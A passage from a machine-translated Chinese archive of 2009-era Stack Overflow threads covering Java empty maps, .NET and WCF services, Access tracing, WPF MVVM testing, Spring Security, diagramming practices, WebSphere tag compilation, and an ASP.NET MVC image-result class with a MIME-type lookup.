Collections.<String, String>emptyMap() 
```

当编译器无法自动确定需要哪种 Map 时（这称为[*类型推断*](http://docs.oracle.com/javase/tutorial/java/generics/genTypeInference.html)），您有时必须使用后者。例如，考虑这样声明的方法：

```
public void foobar(Map<String, String> map){ ... } 
```

将空 Map 直接传递给它时，您必须明确说明类型：

```
foobar(Collections.emptyMap());                 // doesn't compile
foobar(Collections.<String, String>emptyMap()); // works fine 
```

**2）**如果您需要能够修改地图，那么例如：

```
new HashMap<String, String>() 
```

（正如[tehblanx 指出的那样](https://stackoverflow.com/questions/636126/best-way-to-create-an-empty-map-in-java/636134#636134)）

* * *

**附录**：如果您的项目使用[**Guava**](https://github.com/google/guava)，您有以下选择：

**1）**不可变映射：

```
ImmutableMap.of()
// or:
ImmutableMap.<String, String>of() 
```

当然，与`Collections.emptyMap()`. [从 Javadoc](https://google.github.io/guava/releases/19.0/api/docs/com/google/common/collect/ImmutableMap.html#of%28%29)：

> 此映射的行为和性能与 类似`Collections.emptyMap()`，并且主要是为了代码的一致性和可维护性而更可取。

**2）**您可以修改的地图：

```
Maps.newHashMap()
// or:
Maps.<String, String>newHashMap() 
```

[`Maps`](https://google.github.io/guava/releases/19.0/api/docs/com/google/common/collect/Maps.html)也包含用于实例化其他类型地图的类似工厂方法，例如[`TreeMap`](https://google.github.io/guava/releases/19.0/api/docs/com/google/common/collect/Maps.html#newTreeMap%28%29)or [`LinkedHashMap`](https://google.github.io/guava/releases/19.0/api/docs/com/google/common/collect/Maps.html#newLinkedHashMap%28%29)。

* * *

**更新（2018）**：在**Java 9**或更新版本上，创建不可变空映射的最短代码是：

```
Map.of() 
```

...使用[JEP 269](http://openjdk.java.net/jeps/269)中的新[便利工厂方法](https://docs.oracle.com/javase/9/docs/api/java/util/Map.html#of--)。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2009-03-11T20:08:43.923

[Collections.emptyMap()](http://java.sun.com/javase/6/docs/api/java/util/Collections.html#emptyMap())

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2009-03-11T20:08:42.177

[Collections 类的 emptyMap 方法](http://java.sun.com/javase/6/docs/api/java/util/Collections.html#emptyMap%28%29)。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2009-03-11T20:07:16.877

如果你需要一个 HashMap 的实例，最好的方法是：

```
fileParameters = new HashMap<String,String>(); 
```

由于 Map 是一个接口，如果你想创建一个空实例，你需要选择一些实例化它的类。HashMap 看起来和其他任何东西一样好 - 所以就使用它。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2009-03-11T20:10:27.180

或者`Collections.emptyMap()`，如果类型推断不适用于您的情况，
`Collections.<String, String>emptyMap()`

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-04-14T15:44:24.090

由于在许多情况下，空映射用于 null 安全设计，因此您可以使用`nullToEmpty`实用程序方法：

```
class MapUtils {

  static <K,V> Map<K,V> nullToEmpty(Map<K,V> map) {
    if (map != null) {
      return map;
    } else {
       return Collections.<K,V>emptyMap(); // or guava ImmutableMap.of()
    }
  }

} 
```

同样对于集合：

```
class SetUtils {

  static <T> Set<T> nullToEmpty(Set<T> set) {
    if (set != null) {
      return set;
    } else {
      return Collections.<T>emptySet();
    }
  }

} 
```

并列出：

```
class ListUtils {

  static <T> List<T> nullToEmpty(List<T> list) {
    if (list != null) {
      return list;
    } else {
      return Collections.<T>emptyList();
    }
  }

} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-11T20:12:30.873

关于什么 ：

[Map<String, String> s = Collections.emptyMap();](http://java.sun.com/javase/6/docs/api/java/util/Collections.html#emptyMap())

# .net - 公开我的服务器 API 的最佳方式是什么？

> ID：636131
> 
> 赞同：0
> 
> 时间：2009-03-11T20:06:58.780
> 
> 标签：.net, web-services, api, remoting

我有一个需要公开 API 的 .NET Windows 服务。我现在在开发过程中使用远程处理。

现在我所有的方法都接受并返回 XML。对于所需的对象，我已经有很多自定义序列化和反序列化代码。

这些物体都不是很大。

我想让我的 API 轻松地支持多种语言。

我考虑过在服务内部托管一个 Web 服务，也只是简单的套接字。

公开此 API 的最佳方式是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-11T20:09:27.213

使用托管在服务中的 WCF。它干净、灵活且受支持。

# c# - 在我的 Azure 示例解决方案 AspProviders 中，项目 StorageClient 不可用

> ID：636144
> 
> 赞同：2
> 
> 时间：2009-03-11T20:08:53.127
> 
> 标签：c#, visual-studio-2008, azure

我在加载 Azure 示例解决方案 AspProviders 时遇到问题，StorageClient 项目不可用。我错过了什么？我应该检查什么？

（此示例可在 Azure SDK 中找到）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-12T00:58:17.067

StorageClient 是 SDK 中的另一个示例。尝试从示例目录的根目录运行 buildall.cmd。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T00:13:36.753

您是否在运行示例之前创建了存储？文档中应该有关于如何执行此操作的说明。

无论是在云中本地运行，创建存储都是与部署云应用程序分开的步骤。

希望这是有道理的。

# debugging - 跟踪 MS Access DB 活动

> ID：636154
> 
> 赞同：1
> 
> 时间：2009-03-11T20:11:49.843
> 
> 标签：debugging, ms-access

我有一个带有 SQL 服务器后端的 Access 应用程序，其中混合了很多 Access 应用程序本地的数据库对象。我试过运行 SQL Profiler，但除了神秘的 sp_execute 2,4288,4289,4290,4291,4292,4293,4294,4295,4296,4297 之外，我得到的很少。

我想要一个 Access DB 本地的跟踪工具，因此我还选择了任何不会返回 SQL 服务器的活动。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-12T02:33:03.017

据我所知，Access 中没有这样的设施，但根据您的情况，您可以尝试以下几件事：

*   针对 SQL 可执行文件编写一个包装器：这意味着将 VBA 中对`Execute`,`OpenRecordset`等的所有调用替换为将记录查询的替代版本。
    这显然不会捕获所有内容，但它可能会有所帮助。

*   将本地表移动到另一个数据库并使用 ODBC 将它们重新链接到原始 Access 应用程序。然后，您可以使用[ODBC 的日志记录工具](http://publib.boulder.ibm.com/infocenter/iseries/v5r3/index.jsp?topic=/rzaii/rzaiiodbc58.htm)。
    这可能是最好的选择，因为它很容易设置用于调试。
    这不是生产环境的最佳解决方案，因为您对本地表的所有调用实际上都将通过 ODBC，但同样，它是调试的临时解决方案。

*   使用[ShowPlan 和 ISAMStats](http://msdn.microsoft.com/en-us/library/aa188211.aspx#odc_4009c15_topic4)查看[Jet/ACE 如何解释](https://web.archive.org/web/1/http://articles.techrepublic%2ecom%2ecom/5100-10878_11-5064388.html)您的查询并获取其他数据库活动统计信息。
    通过将密钥写入注册表很容易设置，您最终会得到一个描述如何分析查询的日志。
    它对优化比日志记录更有用，但同样，它可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-12-08T18:37:03.073

使用 Flextracer，一个共享软件，免费使用 30 天左右。我的同事刚刚为我们找到了这个，因为我们正在经历类似的情况。问题解决了。

[http://www.geardownload.com/development/flextracer-download.html](http://www.geardownload.com/development/flextracer-download.html)

[]s, Pedro Carneiro Jr. pedrokarneiro@hotmail.com

# jquery - 使用 Flash/Flex 和 jQuery 的图像映射

> ID：636157
> 
> 赞同：0
> 
> 时间：2009-03-11T20:12:41.073
> 
> 标签：jquery, apache-flex, flash, imagemap

有没有办法在 Flash/Flex 中创建图像映射，并通过 jQuery 将其作为 DOM 中的脚本元素？

我目前有一个标准的 HTML 图像映射，当单击某个选择时，会检查同一页面上表单上的复选框（通过 javascript）。我想用更具视觉吸引力的东西来代替它，所以我认为 Flash/Flex 和 jQuery 可能是一个很好的方法，但我不知道 Flex 是否可以很容易地与 jQuery 对话。

作为一个相关问题，如果我在 Flex 组件中有表单元素（如选定的地图区域），并且我在同一页面上使用 HTML 组件发布表单，Flex 字段的值是否会与 HTML 字段一起发布？

（注意：我知道 CSS 图像精灵，并得出结论认为它不适用于我的项目；太多的不规则形状靠得太近，如果我走这条路，我会牺牲太多的准确性。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T21:52:54.673

Javascript 和 Flash 配合得很好。检查[`ExternalInterface`](http://livedocs.adobe.com/flash/9.0/ActionScriptLangRefV3/flash/external/ExternalInterface.html)API 中的类定义。这样，从 Javascript 调用 Flash 例程应该相当容易，反之亦然。

在 Flash 中创建点击地图也应该不会太难。您可以为每个可点击区域创建一个精灵：在 Flash 中轻松绘制矩形、圆形和多边形形状。

至于表单相关问题：不，发布 HTML 表单*不会*在您的 Flash 应用程序中发布表单。话虽如此，在提交表单之前，您没有理由不能使用提到的 ExternalInterface 和 javascript 将表单字段从 Flash 复制到隐藏的 HTML 表单元素中。

高温高压

# wpf - WPF MVVM 和单元测试

> ID：636161
> 
> 赞同：8
> 
> 时间：2009-03-11T20:13:53.427
> 
> 标签：wpf, unit-testing, mvvm

我一直在开发 WPF 应用程序，并且正在使用 ModelViewViewModel 设计模式。我有许多来自视图的事件，这些事件导致 ViewModel 活动。

从 UnitTest 中获取这些事件的合理方法是什么？例如，我想模拟 drop 事件。我真的不想建立一个存根视图，只是为了引发事件。

欢迎任何建议。

谢谢。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-03-11T22:51:42.487

根据 MVVM 模式：

*   View 知道 ViewModel - 它将作为具体实例或接口引用它
*   ViewModel 根本不应该知道视图。

如果您需要处理事件，那么我知道有两种方法可以做到：

**1：**   在视图模型中公开一个命令，并使用数据绑定来触发它。这是我的首选方式，例如：

```
class MyViewModel
{
    public ICommand ClickCommand { get; set; }
}

<Button Command="{Binding Path=ClickCommand}" /> 
```

如果你这样做，那么你可以通过简单地`myViewModel.ClickCommand.Execute`手动调用来测试命令。

**2：**   在viewmodel中暴露一个函数，在文件中写入*绝对最小值*`.xaml.cs`来处理事件和调用函数，例如：

```
class MyViewModel
{
    public void HandleClick(){ }
}

<Button Click="MyClickHandler">

//.xaml.cs file
public void MyClickHandler( Object sender, EventArgs e ) {
    m_viewModel.HandleClick()
} 
```

如果你这样做，那么你可以通过简单地`myViewModel.HandleClick`手动调用来测试。您不必费心对`MyClickHandler`代码进行单元测试，因为它只有 1 行！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T21:29:31.063

听起来您直接在 ViewModel 类中有一个用于放置事件的事件处理程序。在你的 UI 层中有处理程序是否更有意义，这反过来又会在你的 ViewModel 中调用一个函数？这样，您的单元测试可以只调用该函数（就 ViewModel 而言，模拟拖放操作）。

另外，最好将您的 ViewModel 与您的 UI 代码分开。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-07-08T15:48:42.383

Why don't you use a mocking framework, such as `Moq`? Check out their quick start, it has a sample on mocking events. The url is: [http://code.google.com/p/moq/wiki/QuickStart](http://code.google.com/p/moq/wiki/QuickStart)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-20T12:58:56.360

不要引发事件，只需调用处理程序（这意味着它们应该是公共的，并且可能需要更少的以事件处理程序为中心的参数）。查看如何使用“操作”在 Caliburn ( [http://www.codeplex.com/caliburn ) 中完成此操作。](http://www.codeplex.com/caliburn)

# wcf - WCF 自动部署

> ID：636162
> 
> 赞同：2
> 
> 时间：2009-03-11T20:14:12.240
> 
> 标签：wcf, continuous-integration, cruisecontrol.net

我正在设置一些 IIS 托管的 WCF 项目以进行持续集成，并且一直在努力寻找实现自动化部署的最佳和最简单的方法。

现在，我已经使用 CC.NET、MSBUILD 和一个将必要文件复制到部署文件夹的批处理文件进行构建和部署，但我认为必须有更好的方法。

理想情况下，我想要 Web 部署项目之类的东西，但适用于 WCF。

我会选择一个漂亮的 Power Shell 脚本来复制所有必要的文件并排除所有的绒毛。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-15T09:14:37.237

好吧，没有什么可以阻止您使用 Web 部署项目来托管您的 WCF 类库。SVC 文件将被 IIS 拾取并适当地路由。我们使用标准部署项目和自定义操作来创建 IIS vroot，以便我们可以更好地控制设置，但标准 Web 部署项目也可以完成这项工作。

除非您在 IIS7 下运行，否则就 IIS 而言，它只是具有自己处理程序的标准内容。当您使用 Windows 2008 / Windows 7 Beta 时，情况可能会发生一些变化，因为这些版本具有非常不同的处理程序模型。

我发现这篇文章非常有帮助：http: [//msdn.microsoft.com/en-us/library/bb332338.aspx](http://msdn.microsoft.com/en-us/library/bb332338.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T20:21:13.847

这在很大程度上取决于您使用的技术。在之前的项目中，我们使用 TFS 和 Team Build。结果是 WCF 项目被构建到与其部署结构相匹配的文件夹结构中。MSBUILD 脚本中的其他任务触发了部署脚本（我认为是用 PERL 编写的）。这处理了所有部署任务，从删除旧文件夹、创建新文件夹、创建数据库和填充参考数据，然后部署服务和网站，最后运行安装验证脚本并将结果发布到网站。

另一方面，如果你只有一把锤子，那就用锤子砸吧。

# java - Acegi/Spring 安全性是否支持 getUserPrincipal()？

> ID：636172
> 
> 赞同：5
> 
> 时间：2009-03-11T20:16:36.883
> 
> 标签：java, security, spring, servlets, spring-security

我需要将现有应用程序与 Acegi/Spring 安全接口。

为了开始，我正在寻找一条简单的信息：在这种情况下，从我的应用程序调用的 HttpServletRequest.getUserPrincipal() 是否会正确返回通过 Spring 获得的用户名（而不是使用 Spring 特定的对象）？我在谷歌上搜索了这方面的相互矛盾的信息。

我假设如果 Acegi 使用过滤器实现，它能够重载 Servlet API 的 getUserPrincipal()，对吗？

附属问题：如果默认情况下不是这样，有什么办法可以开启吗？

谢谢，

-埃里克

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-10T11:03:36.480

正如之前的用户已经回答的那样，spring security 支持 getUserPrincipal 和 isUserInRole。这是 Spring Security 的工作方式。

当你配置spring时，它可以加载以下过滤器：

[http://static.springframework.org/spring-security/site/reference/html/ns-config.html#filter-stack](http://static.springframework.org/spring-security/site/reference/html/ns-config.html#filter-stack)

作为标准过滤器配置的一部分，过滤`SecurityContextHolderAwareRequestFilter`器被加载。

检查过滤器@ [https://fisheye.springsource.org/browse/spring-security/tags/spring-security-parent-2.0.4/core/src/main/java/org/springframework/security/wrapper/SecurityContextHolderAwareRequestFilter。 java?r=2514](https://fisheye.springsource.org/browse/spring-security/tags/spring-security-parent-2.0.4/core/src/main/java/org/springframework/security/wrapper/SecurityContextHolderAwareRequestFilter.java?r=2514)

您可以看到它包装并将`HttpServletRequest`对象更改为`SecurityContextHolderAwareRequestWrapper`扩展的类，该类`HttpServletRequestWrapper`实现`HttpServletRequest`并将其反馈给标准 Servlet Filter doFilter 链。由于 spring 安全过滤器*应*配置为第一个过滤器，因此所有后续类都将看到`SecurityContextHolderAwareRequestWrapper`。这包括此过滤器后面的 JSP 页面或 Servlet。

When you make a call to `isUserInRole` or `getUserPrincipal` from the JSP page, Servlet or any framework behind this filter, it is calling the `HttpServletRequest` implementation from Spring Security.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T12:52:47.817

如果您使用安全过滤器，是的。我相信这是默认行为。

您要返回的确切类取决于您的配置，但它们都通过 Spring 自己的 org.springframework.security.Authentication 接口实现了 Principal 接口，该接口扩展了它。

我在 Spring 应用程序中使用了 request.getUserPrincipal() 和 request.isUserInRole() 并且它可以无缝地工作，即使在 JSP 中也是如此。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-19T16:23:02.947

我确实相信 Spring Security 将此信息存储在 SecurityContext 而不是请求中。您可以轻松地编写一个 FilterSecurityInterceptor ，它可以被配置为将此信息也添加到请求中。

# modeling - 您在编程过程中使用了哪些图表技术（不是工具）？

> ID：636175
> 
> 赞同：13
> 
> 时间：2009-03-11T20:18:03.090
> 
> 标签：modeling, diagramming

您在编程时使用什么图表技术来帮助您或其他人理解您的程序或设计。我**不是在谈论一个人最喜欢的工具**，尽管一个好的工具可能会极大地帮助一个人绘制图表。

我在这个问题上的目的是找到**人们实际使用的简单有用的图表技术**，并找到新的学习方法。

您是否使用流程图、数据流程图、ER 图等？

网络上到处都是推荐！但是真正的程序员、设计师和代码维护人员**在日常工作中实际使用的是**什么。

感谢您的反馈意见

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-03-11T21:14:00.630

*   非常高级的讨论 - 框可能代表类、包或子系统的上下文图。
*   高级设计 - 显示子系统之间接口的序列图，仍然没有直接使用的类，但可能从中暗示。
*   详细设计 - 类级别的序列图。

如果有一个棘手的算法，例如将多个数据流关联到一个新流中，那么我通常会使用流程图来计算算法。

如果解决方案需要了解状态，则还使用状态图。

这些是我用得最多的。

在进行数据仓库设计时，我会绘制星型模式来确定如何存储数据。在进行事务数据库设计时，我使用实体关系图来处理我们的数据存储。

在设计 UI 时，我只是把它画出来。一旦我开始完成 UI 的某些部分并想尝试某些区域，我将制作一个模板，打印出副本，然后将其用作处理子部分的指南。对于配色方案，可以很方便地使用 gimp 制作图形并为每个设计部分设置图层，然后使用图层为每个部分着色以找到正确的平衡。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-03-11T20:20:59.417

我们真正使用的是什么？也许其他人实际上创建了正式的图表，但在大多数情况下，我只是在一张纸上涂鸦气泡、方框和线条。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-03-11T20:21:41.163

我使用白板进行建模，所以我想“白板建模语言”将是我的答案。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-03-11T20:24:57.270

我将为我正在设计的任何比几个类更大的东西做一个 UML 类图。绘制类图让我花时间思考设计，而不是直接投入代码并总是产生更好的结果。

对于更大和更复杂的架构，我发现序列图是一种交流行为的好方法，尤其是对于多线程系统。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-03-11T20:53:10.430

我使用图表来快速理解遗留代码。创建图表需要一些工作，但最终总是有回报的。

通常我使用类图来了解全局。如果一段代码非常难以理解，有时序列图甚至数据流图。

在设计阶段，我使用类图，并且经常使用状态图。如果类行为与其状态不同，则状态图是完美的。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-03-11T21:03:05.290

我经常使用[序列图](http://en.wikipedia.org/wiki/Sequence_diagram)（画在纸上）。我发现它们为我提供了一个很好的可视化表示方法调用的逻辑流以及我们应用程序中各种系统和组件之间的信息。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-03-11T20:20:53.503

我有一个我使用和开发的主要产品的[流程图。](http://en.wikipedia.org/wiki/Flowchart)

我的团队还经常在白板上使用[UML 图表草图，同时为我们设计新的部件来实现。](http://en.wikipedia.org/wiki/Unified_Modeling_Language)它们在创建设计模式和对需要的类的高级结构进行建模时非常有用。这些*从来都不*是完整的UML...

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-03-11T21:00:50.680

用于讨论的白板。

笔和纸用于较少的临时记录。

'Things to impelement' 的代码存根。

经过测试和工作的代码（带有大量评论）供后代使用。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-03-11T21:05:32.790

对于任何比 shell 脚本更大的项目，我都会在纸和白板上使用 ER 和类图。

流程图，仅当我需要向非程序员解释一个过程时（或者如果它是一个非常复杂的过程，我需要先理解它）。

我的老老板常说“这家伙就是喜欢画画”。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-03-11T21:07:25.670

我绘制了 UML 类、对象和序列图的混蛋版本。虽然我试图忠实于语法，但我更关心表达特定功能背后的主要思想。所以，我会草拟一些东西，请一位同事看一下，如果看起来足够清晰，我们甚至可以扫描它并将其发布到我们的 Wiki 中。

然后，当碰巧我们实际上有一些时间来处理文档时（而且*几乎从来没有*），我将使用[BOUML](http://bouml.free.fr/)并将涂鸦重新绘制成适当的图表。

现在，总而言之，我在一个相对较小的团队（5 个开发人员）工作，用 Java 制作交易和产品配置平台。我们有我们的两种产品，然后我们根据客户的要求另外定制。作为一个紧密联系的社区，几年的周转率很低（零），我们主要将文档用作自己的剩余部分。在此设置中，上述方法效果很好。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-03-11T21:07:26.450

我在 AJAX 开发环境中工作，我编写的大多数后端代码都像关系数据库和前端 javascript（用户界面）之间的管道一样工作。因此，我使用的最常用的“图表”是 JSON 对象，用于描述数据应如何在数据库和接口之间来回传递。它们是简单、通用且易于理解的数据结构。

例子：

> { "id": row['id'], "name": row['name'], "mandatory": row['mandatory'], "rangeDescription": "This is the Range", "globalRate": row ['全球的'] }

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2009-05-13T22:08:10.243

我喜欢数据流图。很多。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-03-11T20:30:48.473

我使用交流所需的任何东西。通常这根本不算什么。有时它是一块白板。

有时，我会使用[Sparx Enterprise Architect](http://www.sparxsystems.com/)，它是一个 UML**建模**工具，尽管它在使用时会生成不错的图表。我已经将它用于需求、用例、活动、序列、域甚至类建模，有时还用于一些逆向工程 ER 图。不惜一切代价来理解这一点。

# websphere - 强制编译 .tag 文件

> ID：636176
> 
> 赞同：3
> 
> 时间：2009-03-11T20:18:08.533
> 
> 标签：websphere, jstl, jsp-tags

如何强制 Websphere 编译我的 .tag 文件？

清理项目、发布、重新启动服务器、添加和删除项目都没有帮助 - 标记文件的 .class 文件没有被重新编译。

如果我删除 .class 文件，我会收到一个错误，指出该类丢失，但它不会重新编译

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-07-28T07:05:39.073

到目前为止，我最好的答案是删除 /temp 目录的相关内容，因为该战争驻留在您的服务器配置文件下。这将强制重新编译应用程序中的所有 jsp，包括 .tag 文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T15:01:58.930

我遇到了同样的问题，然后在有关 Websphere JSP 实现的 IBM 技术期刊中发现了这个问题：

“标记文件源是在 javac 处理包含 JSP 时编译的。”

所以我发现每次更改.tag文件后，我都必须对使用该标签的JSP进行更改。（我只是添加一个空格。）然后当 JSP 编译时，.tag 文件也成功更新。

IBM 技术期刊文章：[http ://www.ibm.com/developerworks/websphere/techjournal/0412_johnson/0412_johnson.html](http://www.ibm.com/developerworks/websphere/techjournal/0412_johnson/0412_johnson.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-19T10:53:43.603

这可能无济于事，但在应用程序安装期间有一个选项，您可以勾选预编译 jsp 页面，这可能会编译您的 .tag 文件

卡尔

# .net - 如何在 ASP.NET MVC 中使用通用处理程序 (ASHX)？

> ID：636179
> 
> 赞同：23
> 
> 时间：2009-03-11T20:18:48.063
> 
> 标签：.net, asp.net, asp.net-mvc, httphandler, ashx

我需要在我的 ASP.NET MVC 应用程序中使用图像生成器，但我不知道是否可以在 ASP.NET MVC 中使用 ASHX。

如果有一个类似于 IHttpHandler 的类继承了 IViewDataContainer，那么我可以在我的 ASHX 上使用 ViewData.Model。

我阅读了[一篇关于它的博客文章，](http://www.marklio.com/marklio/CommentView,guid,df8d6471-83fd-4f66-a799-ef8274979f0e.aspx)但与我在[ASP.NET 论坛中获得的信息相比，它似乎已经过时了](http://forums.asp.net/t/1233238.aspx)

有任何想法吗？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2009-03-11T23:05:05.433

您还可以使用此 ImageResult 类返回图像。

无需处理程序，只需创建一条路线，例如：

/ImageGenerator/{action}/{imageid}/

并为请求返回一个 ImageResult。

```
 public class ImageResult : ActionResult
    {
        public string SourceFilename { get; set; }
        public MemoryStream SourceStream { get; set; }
        public string ContentType { get; set; }
        public ImageResult(string sourceFilename)
        {
            SourceFilename = sourceFilename;
            ContentType = FileTypeHelper.GetContentType(SourceFilename);
        }
        public ImageResult(MemoryStream sourceStream, string contentType)
        {
            SourceStream = sourceStream;
            ContentType = contentType;
        }
        public override void ExecuteResult(ControllerContext context)
        {   
            var res = context.HttpContext.Response;
            res.Clear();
            res.Cache.SetCacheability(HttpCacheability.NoCache);
            res.ContentType = ContentType;

            if (SourceStream != null)
            {
                SourceStream.WriteTo(res.OutputStream);

            }
            else
            {
               res.TransmitFile(SourceFilename);
            }

        }

    } 
```

要使用它，请在控制器中执行以下操作并为其添加路由：

```
public ImageResult GetImage(int imageId)
{
   // Database fetch of image details
   var imageInfo = repository.Get<ImageInfo>(imageId);
   return new ImageResult(imageInfo.FullFilename);
} 
```

也添加了 FileType 辅助类：

```
 public static class FileTypeHelper
{
    public static string GetContentType(string SourceFileName)
    {
        var extension = Path.GetExtension(SourceFileName).ToLower();
         switch (extension)
        {
            case ".ai": return "application/postscript";
            case ".aif": return "audio/x-aiff";
            case ".aifc": return "audio/x-aiff";
            case ".aiff": return "audio/x-aiff";
            case ".asc": return "text/plain";
            case ".au": return "audio/basic";
            case ".avi": return "video/x-msvideo";
            case ".bcpio": return "application/x-bcpio";
            case ".bin": return "application/octet-stream";
            case ".c": return "text/plain";
            case ".cc": return "text/plain";
            case ".ccad": return "application/clariscad";
            case ".cdf": return "application/x-netcdf";
            case ".class": return "application/octet-stream";
            case ".cpio": return "application/x-cpio";
            case ".cpp": return "text/plain";
            case ".cpt": return "application/mac-compactpro";
            case ".cs": return "text/plain";
            case ".csh": return "application/x-csh";
            case ".css": return "text/css";
            case ".dcr": return "application/x-director";
            case ".dir": return "application/x-director";
            case ".dms": return "application/octet-stream";
            case ".doc": return "application/msword";
            case ".drw": return "application/drafting";
            case ".dvi": return "application/x-dvi";
            case ".dwg": return "application/acad";
            case ".dxf": return "application/dxf";
            case ".dxr": return "application/x-director";
            case ".eps": return "application/postscript";
            case ".etx": return "text/x-setext";
            case ".exe": return "application/octet-stream";
            case ".ez": return "application/andrew-inset";
            case ".f": return "text/plain";
            case ".f90": return "text/plain";
            case ".fli": return "video/x-fli";
            case ".flv": return "video/x-flv";
            case ".gif": return "image/gif";
            case ".gtar": return "application/x-gtar";
            case ".gz": return "application/x-gzip";
            case ".h": return "text/plain";
            case ".hdf": return "application/x-hdf";
            case ".hh": return "text/plain";
            case ".hqx": return "application/mac-binhex40";
            case ".htm": return "text/html";
            case ".html": return "text/html";
            case ".ice": return "x-conference/x-cooltalk";
            case ".ief": return "image/ief";
            case ".iges": return "model/iges";
            case ".igs": return "model/iges";
            case ".ips": return "application/x-ipscript";
            case ".ipx": return "application/x-ipix";
            case ".jpe": return "image/jpeg";
            case ".jpeg": return "image/jpeg";
            case ".jpg": return "image/jpeg";
            case ".js": return "application/x-javascript";
            case ".kar": return "audio/midi";
            case ".latex": return "application/x-latex";
            case ".lha": return "application/octet-stream";
            case ".lsp": return "application/x-lisp";
            case ".lzh": return "application/octet-stream";
            case ".m": return "text/plain";
            case ".man": return "application/x-troff-man";
            case ".me": return "application/x-troff-me";
            case ".mesh": return "model/mesh";
            case ".mid": return "audio/midi";
            case ".midi": return "audio/midi";
            case ".mime": return "www/mime";
            case ".mov": return "video/quicktime";
            case ".movie": return "video/x-sgi-movie";
            case ".mp2": return "audio/mpeg";
            case ".mp3": return "audio/mpeg";
            case ".mpe": return "video/mpeg";
            case ".mpeg": return "video/mpeg";
            case ".mpg": return "video/mpeg";
            case ".mpga": return "audio/mpeg";
            case ".ms": return "application/x-troff-ms";
            case ".msh": return "model/mesh";
            case ".nc": return "application/x-netcdf";
            case ".oda": return "application/oda";
            case ".pbm": return "image/x-portable-bitmap";
            case ".pdb": return "chemical/x-pdb";
            case ".pdf": return "application/pdf";
            case ".pgm": return "image/x-portable-graymap";
            case ".pgn": return "application/x-chess-pgn";
            case ".png": return "image/png";
            case ".pnm": return "image/x-portable-anymap";
            case ".pot": return "application/mspowerpoint";
            case ".ppm": return "image/x-portable-pixmap";
            case ".pps": return "application/mspowerpoint";
            case ".ppt": return "application/mspowerpoint";
            case ".ppz": return "application/mspowerpoint";
            case ".pre": return "application/x-freelance";
            case ".prt": return "application/pro_eng";
            case ".ps": return "application/postscript";
            case ".qt": return "video/quicktime";
            case ".ra": return "audio/x-realaudio";
            case ".ram": return "audio/x-pn-realaudio";
            case ".ras": return "image/cmu-raster";
            case ".rgb": return "image/x-rgb";
            case ".rm": return "audio/x-pn-realaudio";
            case ".roff": return "application/x-troff";
            case ".rpm": return "audio/x-pn-realaudio-plugin";
            case ".rtf": return "text/rtf";
            case ".rtx": return "text/richtext";
            case ".scm": return "application/x-lotusscreencam";
            case ".set": return "application/set";
            case ".sgm": return "text/sgml";
            case ".sgml": return "text/sgml";
            case ".sh": return "application/x-sh";
            case ".shar": return "application/x-shar";
            case ".silo": return "model/mesh";
            case ".sit": return "application/x-stuffit";
            case ".skd": return "application/x-koan";
            case ".skm": return "application/x-koan";
            case ".skp": return "application/x-koan";
            case ".skt": return "application/x-koan";
            case ".smi": return "application/smil";
            case ".smil": return "application/smil";
            case ".snd": return "audio/basic";
            case ".sol": return "application/solids";
            case ".spl": return "application/x-futuresplash";
            case ".src": return "application/x-wais-source";
            case ".step": return "application/STEP";
            case ".stl": return "application/SLA";
            case ".stp": return "application/STEP";
            case ".sv4cpio": return "application/x-sv4cpio";
            case ".sv4crc": return "application/x-sv4crc";
            case ".swf": return "application/x-shockwave-flash";
            case ".t": return "application/x-troff";
            case ".tar": return "application/x-tar";
            case ".tcl": return "application/x-tcl";
            case ".tex": return "application/x-tex";
            case ".tif": return "image/tiff";
            case ".tiff": return "image/tiff";
            case ".tr": return "application/x-troff";
            case ".tsi": return "audio/TSP-audio";
            case ".tsp": return "application/dsptype";
            case ".tsv": return "text/tab-separated-values";
            case ".txt": return "text/plain";
            case ".unv": return "application/i-deas";
            case ".ustar": return "application/x-ustar";
            case ".vcd": return "application/x-cdlink";
            case ".vda": return "application/vda";
            case ".vrml": return "model/vrml";
            case ".wav": return "audio/x-wav";
            case ".wrl": return "model/vrml";
            case ".xbm": return "image/x-xbitmap";
            case ".xlc": return "application/vnd.ms-excel";
            case ".xll": return "application/vnd.ms-excel";
            case ".xlm": return "application/vnd.ms-excel";
            case ".xls": return "application/vnd.ms-excel";
            case ".xlw": return "application/vnd.ms-excel";
